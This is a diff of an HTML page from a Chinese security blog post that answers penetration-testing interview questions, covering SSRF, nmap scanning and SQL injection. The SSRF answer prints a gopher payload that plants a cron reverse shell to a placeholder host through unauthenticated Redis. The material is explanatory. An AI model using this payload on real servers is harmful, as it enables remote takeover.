@@ -17,18 +17,18 @@
 <meta property="og:site_name" content="Sn1pEr&#39;s blog">
 <meta property="og:description" content="问到的面试题，记一下，欢迎大佬补充和指正">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
-<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
-<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401105338.png">
-<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
-<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/image-20210928014101.png">
-<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/image-20210928015210.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/img-20210401105338.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/image-20210928014101.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/image-20210928015210.png">
 <meta property="article:published_time" content="2021-03-30T02:29:18.000Z">
-<meta property="article:modified_time" content="2022-09-30T09:53:08.794Z">
+<meta property="article:modified_time" content="2024-09-09T15:35:03.188Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="面试题">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
+<meta name="twitter:image" content="https://sn1per-ssd.github.io/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
   
     <link rel="alternative" href="/atom.xml" title="Sn1pEr&#39;s blog" type="application/atom+xml">
   
@@ -272,7 +272,7 @@ var _hmt = _hmt || [];
 <a id="more"></a>
 
 <h3 id="什么是SSRF，怎么判断有SSRF，他有什么危害"><a href="#什么是SSRF，怎么判断有SSRF，他有什么危害" class="headerlink" title="什么是SSRF，怎么判断有SSRF，他有什么危害"></a>什么是SSRF，怎么判断有SSRF，他有什么危害</h3><p>SSRF是服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，简单地说，就是利用一个可发起网络请求的服务当作跳板来攻击其他服务。</p>
-<p><img src="./img-20210415111601.png"></p>
+<p><img src="/./%E9%9D%A2%E8%AF%95/img-20210415111601.png"></p>
 <p>一般用来读取本机文件(file协议)，端口存活（<code>?url=127.0.0.1:1</code>，爆破端口），dict协议读取端口版本信息（<code>?url=dict://127.0.0.1:22</code>），gopher通过redis反弹shell（假设网站路径为/var/www/html，且redis可未授权访问 <code>?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code>）</p>
 <p>如何判断：利用dnslog生成url，然后用http协议访问即可。</p>
 <p>危害：file协议等读取本地文件，探测内网IP，扫描内网端口，攻击内网或本地的应用程序</p>
@@ -301,13 +301,13 @@ var _hmt = _hmt || [];
 </ol>
 <h3 id="nmap探测端口存活的原理"><a href="#nmap探测端口存活的原理" class="headerlink" title="nmap探测端口存活的原理"></a>nmap探测端口存活的原理</h3><p>192.168.80.128为ubuntu，且开放了tcp80端口</p>
 <p>以<code>nmap -sU -p 80 192.168.80.128</code>为例，看看wireshark抓的包</p>
-<p><img src="./img-20210401104534.png"></p>
+<p><img src="/./%E9%9D%A2%E8%AF%95/img-20210401104534.png"></p>
 <p>可以发现直接向该主机发送了一个UDP报文，然后128主机发送ICMP报文显示不可达，也就是该端口关闭了。</p>
 <p>再以<code>nmap -sT -p 80 192.168.80.128</code>为例，看到wireshark抓包为</p>
-<p><img src="./img-20210401105338.png"></p>
+<p><img src="/./%E9%9D%A2%E8%AF%95/img-20210401105338.png"></p>
 <p>可以看到，是经过TCP三次握手，建立连接之后确定端口开放。</p>
 <p>再看<code>-sY</code>参数，它是发送SCTP报文，扫描SCTP协议的端口开放情况。</p>
-<p><img src="./img-20210401104534.png"></p>
+<p><img src="/./%E9%9D%A2%E8%AF%95/img-20210401104534.png"></p>
 <p>也就是说，不同的参数，是让nmap发送不同的报文给对应端口。</p>
 <p>能建立连接或有回应则开放或关闭（官方对于关闭端口的解释是：它接受Nmap的探测报文并作出响应）。而由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放则为过滤的。</p>
 <h3 id="sql-getshell方法"><a href="#sql-getshell方法" class="headerlink" title="sql getshell方法"></a>sql getshell方法</h3><p>如果是mysql，首先要看secure_file_priv环境变量，而且要知道读写的绝对路径。</p>
@@ -342,11 +342,11 @@ var _hmt = _hmt || [];
 <p>我们的sql语句需要这样写：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">&quot;select * from user where uname=?;&quot;</span>;</span><br><span class="line">ResultSet rs = DBUtil.re_querySQL(sql,username);</span><br></pre></td></tr></table></figure>
 <p>经过预编译后，我们查看日志：</p>
-<p><img src="./image-20210928014101.png">，发现在进行sql查询时，依然为正常查询语句，但实际上已经进行了预编译。</p>
+<p><img src="/./%E9%9D%A2%E8%AF%95/image-20210928014101.png">，发现在进行sql查询时，依然为正常查询语句，但实际上已经进行了预编译。</p>
 <p>服务器预编译，则需要手动开启：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;xxx?useServerPrepStmts&#x3D;true&amp;cachePrepStmts&#x3D;true</span><br></pre></td></tr></table></figure>
 <p>（嫌麻烦，我就直接用workbentch之类的直接执行语句了）日志如下：</p>
-<p><img src="./image-20210928015210.png"></p>
+<p><img src="/./%E9%9D%A2%E8%AF%95/image-20210928015210.png"></p>
 <p>可以看到，明显有占位符和赋值的操作。</p>
 <p>值得注意的是，预编译一定要用占位符，而不能自己进行拼接，否则依然存在注入（废话）</p>
 <p>经典操作：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190170">https://www.anquanke.com/post/id/190170</a></p>
@@ -573,7 +573,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -696,11 +696,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -716,23 +724,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -756,6 +760,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -776,11 +788,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -796,15 +816,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -812,7 +824,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -820,11 +832,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
